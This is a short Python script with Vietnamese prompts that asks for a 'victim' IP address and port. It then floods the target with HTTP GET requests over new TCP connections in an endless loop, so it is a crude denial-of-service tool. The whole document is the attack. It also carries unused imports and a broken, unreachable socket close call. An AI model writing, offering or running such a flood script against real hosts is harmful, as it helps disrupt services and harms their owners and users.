from scapy.all import *;
import random
import sys
import socket as s

target_ip=raw_input("Nhap dia chi nan nhan: ")
target_port=int(raw_input("Nhap port: "))
try:
    while True:
        client=s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect((target_ip,target_port))
        request="GET / HTTP/1.1\r\nHOST:{}\r\n\r\n".format(target_ip)
        client.send(request.encode())
        print("Da gui HTTP Get toi {}".format(s.gethostbyname(target_ip)))
    s.close()
except Exception as e:
    print(e)
    sys.exit()

